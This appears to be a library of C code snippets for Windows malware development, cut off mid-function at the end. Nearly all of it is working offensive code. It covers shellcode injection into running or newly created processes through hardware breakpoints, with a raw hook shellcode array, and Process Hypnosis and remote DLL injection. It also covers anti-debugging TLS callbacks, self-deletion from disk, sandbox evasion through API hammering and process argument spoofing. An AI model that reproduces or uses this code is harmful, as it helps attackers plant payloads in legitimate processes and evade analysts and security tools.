BOOL ExistingProcHardwareBpThreadlessInject(IN LPWSTR szProcessName, IN ULONG_PTR uTargetFuncAddress, IN PBYTE pShellcodeBuffer, IN DWORD dwShellcodeLength) {

	BOOL					bResult			= FALSE;
	THREAD_PARMS			ThreadParms		= { 0 };
	DEBUG_EVENT				DebugEvent		= { 0 };
	HANDLE					hThread			= NULL;

	if (!szProcessName || !uTargetFuncAddress || !pShellcodeBuffer || !dwShellcodeLength)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (!HardwareHookOrUnhookProcess(szProcessName, &ThreadParms.dwProcessId, NULL, Enumerate))
		goto _END_OF_FUNC;

	printf("[i] Found Target Process With PID: %d\n", ThreadParms.dwProcessId);

	if (!(ThreadParms.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ThreadParms.dwProcessId))) {
		printf("[!] OpenProcess Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!DebugActiveProcess(ThreadParms.dwProcessId)) {
		printf("[!] DebugActiveProcess Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	ThreadParms.szProcessName		= szProcessName;
	ThreadParms.uTargetFuncAddress	= uTargetFuncAddress;
	ThreadParms.dwPayloadSize		= dwShellcodeLength;
	ThreadParms.uPayloadAddress		= pShellcodeBuffer;

	if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)HandleHookingThreadFunction, &ThreadParms, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[i] Parsing Debug Events ... \n");

	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

			case EXCEPTION_DEBUG_EVENT: {

				if (DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP) {
					printf("[i] Hardware BreakPoint Hit At: 0x%p\n", DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress);

					if (DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == uTargetFuncAddress) {
						printf("[*] Target Function Hit\n");

						if (HijackTargetThread(DebugEvent.dwThreadId, ThreadParms.uMemoryHole)) {

							printf("[*] Thread %d Hijacked !\n", DebugEvent.dwThreadId);

							// Remove Hardware BreakPoints From All Threads
							HardwareHookOrUnhookProcess(szProcessName, NULL, uTargetFuncAddress, UninstallHooks);

							// Mark event as handled so that the thread can be resumed (and thus hijacked)
							ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

							// Exit
							goto _END_OF_FUNC;
						}
						else
							printf("[-] Failed To Hijack %d Thread \n", DebugEvent.dwThreadId);
					}
				}

				break;
			};

			case EXIT_PROCESS_DEBUG_EVENT: {
				printf("[i] Remote Process Terminated \n");
				return 0;
			};

			default: {
				// printf("[!] Unhandled Exception [0x%0.8X] At: 0x%p \n", DebugEvent.u.Exception.ExceptionRecord.ExceptionCode, DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress);
				break;
			};

		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}



	bResult = TRUE;

_END_OF_FUNC:
	if (ThreadParms.hProcess)
		CloseHandle(ThreadParms.hProcess);
	if (ThreadParms.dwProcessId && !DebugActiveProcessStop(ThreadParms.dwProcessId)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
		FALSE;
	}
	if (hThread)
		CloseHandle(hThread);
	return bResult;
}
```
### Process Hypnosis
```c
#include <windows.h>
#include <stdio.h>

BOOL InjectShellcodeViaProcessHypnosis(IN LPWSTR szTargetProcessPath, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize, OUT OPTIONAL PPROCESS_INFORMATION pProcessInfo) {

	BOOL					bResult					= FALSE;
	STARTUPINFOW			StartupInfo				= { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo				= { 0 };
	DEBUG_EVENT				DebugEvent				= { 0 };
	SIZE_T					sNumberOfBytesWritten	= 0x00;
	DWORD					dwDllsLoadedCount		= 0x00;


	if (!CreateProcessW(szTargetProcessPath, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		return -1;
	}
	printf("[i] %ws Process Created With PID: %d \n", (wcsrchr((szTargetProcessPath), L'/') ? wcsrchr((szTargetProcessPath), L'/') + 1 : (wcsrchr((szTargetProcessPath), L'\\') ? wcsrchr((szTargetProcessPath), L'\\') + 1 : (szTargetProcessPath))), ProcessInfo.dwProcessId);


	// parsing all debug events
	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

			case LOAD_DLL_DEBUG_EVENT: {
				// you can wait for a specific dll to load before hijacking the thread (in case your shellcode depends on it)
				/*
				LPVOID	pDllImgName					= NULL;
				WCHAR	szModuleFileName[MAX_PATH]	= { 0 };
				SIZE_T	sNmbrOfBytesRead			= 0x00;


				if (!ReadProcessMemory(ProcessInfo.hProcess, DebugEvent.u.LoadDll.lpImageName, &pDllImgName, sizeof(LPVOID), &sNmbrOfBytesRead) || sNmbrOfBytesRead != sizeof(LPVOID)) {
					printf("[!] ReadProcessMemory [1] Failed With Error: %d \n", GetLastError());
					break;
				}

				if (!ReadProcessMemory(ProcessInfo.hProcess, pDllImgName, szModuleFileName, MAX_PATH, &sNmbrOfBytesRead)) {
					printf("[!] ReadProcessMemory [2] Failed With Error: %d \n", GetLastError());
					break;
				}

				printf("[i] Loaded '%ws' | 0x%p\n", szModuleFileName, DebugEvent.u.LoadDll.lpBaseOfDll);
				*/

				dwDllsLoadedCount++;
				break;
			}

			// new thread creation
			case CREATE_THREAD_DEBUG_EVENT: {

				printf("[+] Targetting Thread: %d\n", GetThreadId(DebugEvent.u.CreateThread.hThread));
				printf("[i] Writing Shellcode At Thread's Start Address: 0x%p \n", DebugEvent.u.CreateProcessInfo.lpStartAddress);

				if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, pShellcodeBuffer, sShellcodeSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcodeSize) {
					printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
					printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, (int)sShellcodeSize);
					goto _END_OF_FUNC;
				}

				if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
					printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
					goto _END_OF_FUNC;
				}

				// resume thread creation
				ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

				bResult = TRUE;

				// detach child process
				goto _END_OF_FUNC;
			};

			case EXIT_PROCESS_DEBUG_EVENT:
				printf("[i] Remote Process Terminated \n");
				return 0;

			default:
				break;
		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}

_END_OF_FUNC:
	if (pProcessInfo)
		*pProcessInfo = ProcessInfo;
	return bResult;
}
```
### Hardware Breakpoint Threadless Injection (New Process)
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "ThreadlessInjection.h"

// ==========================================================================================================================
/* global variable from ThreadlessInjection.c */

extern NT_API g_NtApi;

/* threadless injection shellcode */

unsigned char g_HookShellcode[42] = {
		0x5B, 0x48, 0x83, 0xEB, 0x05, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50,
		0x41, 0x53, 0x41, 0x52, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00,
		0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41,
		0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};


// ==========================================================================================================================



BOOL HandleHookingThreadFunction(IN OUT PTHREAD_PARMS pThreadParm) {

	NTSTATUS	STATUS					= STATUS_SUCCESS;
	SIZE_T		sTmpSizeVar				= pThreadParm->dwPayloadSize + sizeof(g_HookShellcode),
				sNmbrOfBytesWritten		= NULL;
	DWORD		dwOldProtection			= 0x00;


	/* wait for 3 sec - this will provide some time for the debug event handler to initialize and load all required dlls */
	WaitForSingleObject(pThreadParm->hProcess, 1 * 1000);

	printf("[i] Wait Delay Finished\n");

	/* find memory hole */
	if (!FindMemoryHole(pThreadParm->hProcess, &pThreadParm->uMemoryHole, pThreadParm->uTargetFuncAddress, sTmpSizeVar)) {
		printf("[!] Failed To Allocate A Memory Hole \n");
		return FALSE;
	}

	printf("[+] Discorvered Memory Hole At: 0x%p\n", pThreadParm->uMemoryHole);

	/* write 'g_HookShellcode' at the start of the memory hole */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(pThreadParm->hProcess, pThreadParm->uMemoryHole, g_HookShellcode, sizeof(g_HookShellcode), &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sizeof(g_HookShellcode)) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: %d \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sizeof(g_HookShellcode));
		return FALSE;
	}

	/* write the main payload under the 'g_HookShellcode' shellcode in the memory hole */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(pThreadParm->hProcess, (pThreadParm->uMemoryHole + sNmbrOfBytesWritten), pThreadParm->uPayloadAddress, pThreadParm->dwPayloadSize, &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != pThreadParm->dwPayloadSize) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: %d \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, pThreadParm->dwPayloadSize);
		return FALSE;
	}

	printf("[+] Payloads Are Written At The Memory Hole\n");

	/* mark as executable */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(pThreadParm->hProcess, &pThreadParm->uMemoryHole, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory Failed With Error: %d \n", STATUS);
		return FALSE;
	}

	/* install a hardware breakpoint at 'pThreadParm->uTargetFuncAddress' in every thread of the target process */
	if (!HardwareHookOrUnhookProcess(pThreadParm->dwProcessId, pThreadParm->uTargetFuncAddress, TRUE)) {
		printf("[!] HardwareHookOrUnhookProcess Failed To Install A Hook At: 0x%p\n", pThreadParm->uTargetFuncAddress);
		return FALSE;
	}

	return TRUE;
}


// ==========================================================================================================================


BOOL NewProcHardwareBpThreadlessInject(IN LPWSTR szTargetProcessPath, IN ULONG_PTR uTargetFuncAddress, IN PBYTE pShellcodeBuffer, IN DWORD dwShellcodeLength, OUT OPTIONAL PPROCESS_INFORMATION pProcessInfo) {

	BOOL					bResult				= FALSE;
	THREAD_PARMS			ThreadParms			= { 0 };
	STARTUPINFOW			StartupInfo			= { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo			= { 0 };
	DEBUG_EVENT				DebugEvent			= { 0 };
	HANDLE					hThread				= NULL;

	if (!szTargetProcessPath || !uTargetFuncAddress || !pShellcodeBuffer || !dwShellcodeLength)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (!CreateProcessW(szTargetProcessPath, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[i] Created Target Process With PID: %d\n", ProcessInfo.dwProcessId);

	ThreadParms.hProcess			= ProcessInfo.hProcess;
	ThreadParms.dwProcessId			= ProcessInfo.dwProcessId;
	ThreadParms.uTargetFuncAddress	= uTargetFuncAddress;
	ThreadParms.dwPayloadSize		= dwShellcodeLength;
	ThreadParms.uPayloadAddress		= pShellcodeBuffer;


	if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)HandleHookingThreadFunction, &ThreadParms, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[i] Parsing Debug Events ... \n");

	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

			case EXCEPTION_DEBUG_EVENT: {

				if (DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP) {
					printf("[i] Hardware BreakPoint Hit At: 0x%p\n", DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress);

					if (DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == uTargetFuncAddress) {
						printf("[*] Target Function Hit\n");

						if (HijackTargetThread(DebugEvent.dwThreadId, ThreadParms.uMemoryHole)) {

							printf("[*] Thread %d Hijacked !\n", DebugEvent.dwThreadId);

							// Remove Hardware BreakPoints From All Threads
							HardwareHookOrUnhookProcess(DebugEvent.dwProcessId, NULL, FALSE);

							// Mark event as handled so that the thread can be resumed (and thus hijacked)
							ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

							// Exit
							goto _END_OF_FUNC;
						}
						else
							printf("[-] Failed To Hijack %d Thread \n", DebugEvent.dwThreadId);
					}
				}

				break;
			};

			case EXIT_PROCESS_DEBUG_EVENT: {
				printf("[i] Remote Process Terminated \n");
				return 0;
			};

			default: {
				// printf("[!] Unhandled Exception [0x%0.8X] At: 0x%p \n", DebugEvent.u.Exception.ExceptionRecord.ExceptionCode, DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress);
				break;
			};

		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}



	bResult = TRUE;

_END_OF_FUNC:
	if (pProcessInfo)
		*pProcessInfo = ProcessInfo;
	else {
		if (ProcessInfo.hProcess)
			CloseHandle(ProcessInfo.hProcess);
		if (ProcessInfo.hThread)
			CloseHandle(ProcessInfo.hThread);
	}
	if (ProcessInfo.dwProcessId && !DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
		FALSE;
	}
	if (hThread)
		CloseHandle(hThread);
	return bResult;
}
```
### Remote DLL Injection (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL InjectDllRemotelyA(IN HANDLE hProcess, IN LPSTR cDllFilePath) {

	if (!hProcess || !cDllFilePath)
		return FALSE;

	LPVOID		pLoadLibraryA			= NULL;
	SIZE_T		sNumberOfBytesWritten	= NULL;
	LPVOID		pDllPathAddress			= NULL;
	DWORD		dwDllPathLength			= strlen(cDllFilePath) + sizeof(CHAR);

	if (!(pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pDllPathAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pDllPathAddress, cDllFilePath, dwDllPathLength, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwDllPathLength) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, dwDllPathLength);
		return FALSE;
	}

	if (!CreateRemoteThread(hProcess, NULL, 0x00, pLoadLibraryA, pDllPathAddress, 0x00, NULL)) {
		printf("[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Check Entry Point Breakpoint via TLS Callbacks
```c
#include <windows.h>
#include <stdio.h>
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")

#define OVERWRITE_SIZE				0x500
#define INT3_INSTRUCTION_OPCODE		0xCC

//----------------------------------------------------------------------------------------------------------------
#define ERROR_BUF_SIZE				(MAX_PATH * 2)

#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }

//----------------------------------------------------------------------------------------------------------------

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}

//----------------------------------------------------------------------------------------------------------------
// TLS Callback Function Prototypes:
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()

//----------------------------------------------------------------------------------------------------------------

VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

	DWORD		dwOldProtection		= 0x00;

	if (dwReason == DLL_PROCESS_ATTACH) {
		PRINT("[TLS][i] Main Function Address: 0x%p \n", main);

		if (*(BYTE*)main == INT3_INSTRUCTION_OPCODE) {
			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");

			// Overwrite main function - process crash
			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
				memset(main, 0xFF, OVERWRITE_SIZE);
				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
			}

			else {
				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
			}

		}
	}
}
```
### Anti-Analysis Via Self-Deletion
```c
#include <windows.h>
#include <stdio.h>
// Custom FILE_RENAME_INFO structure definition
typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
    union {
        BOOLEAN ReplaceIfExists;
        DWORD Flags;
    } DUMMYUNIONNAME;
#else
    BOOLEAN ReplaceIfExists;
#endif
    HANDLE RootDirectory;
    DWORD FileNameLength;
    WCHAR FileName[MAX_PATH];     // Instead of FileName[1]
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;


BOOL DeleteSelfFromDisk() {

    CONST WCHAR                 NEW_STREAM[7]               = L":%x%x\x00";
    BOOL                        bSTATE                      = FALSE;
    WCHAR					    szFileName[MAX_PATH * 2]    = { 0x00 };
    FILE_RENAME_INFO2           FileRenameInfo_2            = { .FileNameLength = sizeof(NEW_STREAM), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };
    FILE_DISPOSITION_INFO       FileDisposalInfo            = { .DeleteFile = TRUE };
    HANDLE                      hLocalImgFileHandle         = INVALID_HANDLE_VALUE;

    if (GetModuleFileNameW(NULL, szFileName, (MAX_PATH * 2)) == 0x00) {
        printf("[!] GetModuleFileNameW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    swprintf(FileRenameInfo_2.FileName, MAX_PATH, NEW_STREAM, rand(), rand() * rand());

    if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!SetFileInformationByHandle(hLocalImgFileHandle, FileRenameInfo, &FileRenameInfo_2, sizeof(FileRenameInfo_2))) {
        printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    CloseHandle(hLocalImgFileHandle);

    if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!SetFileInformationByHandle(hLocalImgFileHandle, FileDispositionInfo, &FileDisposalInfo, sizeof(FileDisposalInfo))) {
        printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bSTATE = TRUE;

_END_OF_FUNC:
    if (hLocalImgFileHandle != INVALID_HANDLE_VALUE)
        CloseHandle(hLocalImgFileHandle);
    return bSTATE;
}
```
### Delaying Execution Using API Hammering
```c
#include <windows.h>
#include <stdio.h>
#define DELETE_HANDLE(hFile)                                    \
    if (hFile != INVALID_HANDLE_VALUE && hFile != NULL){        \
        CloseHandle(hFile);                                     \
        hFile = NULL;                                           \
    }

#define DELETE_HEAP_PNTR(pBuffer)                                \
    if (pBuffer != NULL){                                        \
        HeapFree(GetProcessHeap(), 0x00, pBuffer);               \
        pBuffer = NULL;                                          \
    }

BOOL ApiHammering(IN DWORD dwStress) {

    BOOL        bResult                     = FALSE;
    WCHAR		szTmpFileName[MAX_PATH]     = { 0x00 };
    WCHAR		szTmpPath[MAX_PATH]         = { 0x00 };
    HANDLE      hWriteFile                  = INVALID_HANDLE_VALUE,
                hReadFile                   = INVALID_HANDLE_VALUE;
    PBYTE       pTmpPntrVar                 = NULL;
    DWORD       dwTmpLengthVar              = 0x00;
    CONST DWORD dwBufferSize                = 0xFFFFF;

    if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
        printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetTempFileNameW(szTmpPath, L"AH", 0x00, szTmpFileName) == 0x00) {
        printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    for (DWORD i = 0; i < dwStress; i++) {

        if (!(pTmpPntrVar = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize))) {
            printf("[!] HeapAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if ((hWriteFile = CreateFileW(szTmpFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        memset(pTmpPntrVar, rand(), dwBufferSize);

        if (!WriteFile(hWriteFile, pTmpPntrVar, dwBufferSize, &dwTmpLengthVar, NULL) || dwBufferSize != dwTmpLengthVar) {
            printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
            printf("[i] Wrote %d of %d Bytes\n", dwTmpLengthVar, dwBufferSize);
            goto _END_OF_FUNC;
        }

        DELETE_HANDLE(hWriteFile);
        memset(pTmpPntrVar, 0x00, dwBufferSize);

        if ((hReadFile = CreateFileW(szTmpFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if (!ReadFile(hReadFile, pTmpPntrVar, dwBufferSize, &dwTmpLengthVar, NULL) || dwBufferSize != dwTmpLengthVar) {
            printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
            printf("[i] Read %d of %d Bytes\n", dwTmpLengthVar, dwBufferSize);
            goto _END_OF_FUNC;
        }

        DELETE_HANDLE(hReadFile);
        memset(pTmpPntrVar, 0x00, dwBufferSize);

        DELETE_HEAP_PNTR(pTmpPntrVar);
    }

    bResult = TRUE;

_END_OF_FUNC:
    DELETE_HANDLE(hReadFile);
    DELETE_HANDLE(hWriteFile);
    DELETE_HEAP_PNTR(pTmpPntrVar);
    return bResult;
}

BOOL DelayExecutionViaApiHammering(IN DWORD dwMilliSeconds) {

    DWORD       dwT0    = 0x00,
                dwT1    = 0x00;

    dwT0 = GetTickCount64();

    // Check "Convert Seconds To Cycles" section in module 75
    if (!ApiHammering(dwMilliSeconds * 220))
        return FALSE;

    dwT1 = GetTickCount64();

    if ((dwT1 - dwT0) < dwMilliSeconds)
        return FALSE;
    else
        return TRUE;
}
```
### Random Key Generation
```c
#include <windows.h>
#include <stdio.h>
PBYTE GenerateRandomKey2(IN DWORD dwKeySize) {

	PBYTE			pKey				= NULL;
	unsigned short	us2RightMostBytes	= NULL;

	if (!(pKey = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeySize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return NULL;
	}

	us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);

	for (int i = 0; i < dwKeySize; i++) {
		pKey[i] = (__TIME__[i % 6] * rand() + us2RightMostBytes) % 0xFF;
		srand(__TIME__[rand() % 6] + us2RightMostBytes);
	}

	return pKey;
}
```
### Random Key Generation (2)
```c
#include <windows.h>
#include <stdio.h>
// https://learn.microsoft.com/en-us/cpp/intrinsics/x64-amd64-intrinsics-list?view=msvc-170
extern int __cdecl _rdrand32_step(unsigned int*);

PBYTE GenerateRandomKey3(IN DWORD dwKeySize) {

	PBYTE			pKey				= NULL;
	unsigned short	us2RightMostBytes	= NULL;
	unsigned int	uiSeed				= 0x00;
	BOOL			bResult				= FALSE;

	if (!(pKey = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeySize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return NULL;
	}

	us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);

	for (int i = 0; i < dwKeySize; i++) {

		if (!_rdrand32_step(&uiSeed))
			goto _END_OF_FUNC;

		if (i % 2 == 0)
			pKey[i] = (unsigned int)(((us2RightMostBytes ^ uiSeed) & 0xFF) % 0xFF);
		else
			pKey[i] = (unsigned int)((((us2RightMostBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (!bResult && pKey) {
		HeapFree(GetProcessHeap(), 0x00, pKey);
		return NULL;
	}
	return pKey;
}
```
### Fetch a Pointer To PEB
```c
#include <windows.h>
#include <stdio.h>
#include <Winternl.h>

PPEB FetchPPEB() {

#ifdef _WIN64
	return (PPEB)__readgsqword(0x60);
#else
	return (PPEB)__readfsdword(0x30);
#endif
	return NULL;
}
```
### Argument Spoofing (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#include <Winternl.h>

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL CreateArgsSpoofedProcessA(IN LPSTR cProcessImgNameAndParms, IN LPCWSTR szMaliciousArgs, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!cProcessImgNameAndParms || !szMaliciousArgs || !pProcessInfo)
		return FALSE;

	BOOL							bSTATE						= FALSE;
	STARTUPINFOA					StartupInfo					= { 0 };
	PROCESS_BASIC_INFORMATION		ProcessInfo					= { 0 };
	PPEB							pPeb						= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParms			= NULL;
	fnNtQueryInformationProcess		pNtQueryInformationProcess	= NULL;
	DWORD							dwCreationFlags				= (CREATE_SUSPENDED);
	NTSTATUS						STATUS						= 0x00;
	SIZE_T							sTmpReturnSize1				= NULL,
									sTmpReturnSize2				= NULL;
	PCHAR							pcDuplicateStr				= NULL,
									pcLastSlash					= NULL;

	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFOA));
	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!(pcDuplicateStr = _strdup(cProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%s\" - %d\n", cProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pcLastSlash = strrchr(pcDuplicateStr, '\\'))
		*pcLastSlash = '\0';

	if (!(pNtQueryInformationProcess = GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationProcess"))) {
		printf("[!] GetProcAddress Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pcDuplicateStr, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQueryInformationProcess(pProcessInfo->hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(PROCESS_BASIC_INFORMATION), &sTmpReturnSize1)) != 0x00 || !ProcessInfo.PebBaseAddress) {
		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pPeb = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpReturnSize1))) {
